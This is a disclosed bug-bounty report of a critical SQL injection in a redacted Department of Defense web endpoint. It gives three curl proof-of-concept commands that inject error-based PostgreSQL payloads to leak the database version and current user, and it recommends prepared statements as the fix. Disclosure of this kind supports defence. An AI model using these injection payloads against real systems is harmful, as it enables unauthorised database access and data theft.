# SQL Injection in █████

## Report Details
- **Report ID**: 1489744
- **URL**: https://hackerone.com/reports/1489744
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-02-23T13:30:42.273Z
- **Disclosed**: 2022-04-07T19:59:52.168Z

## Reporter
- **Username**: lubak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl command injecting query, returning current database:
curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

POC 3 - curl command injecting query, returning current user:
 curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

## Suggested Mitigation/Remediation Actions
The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.



## Attachments
No attachments
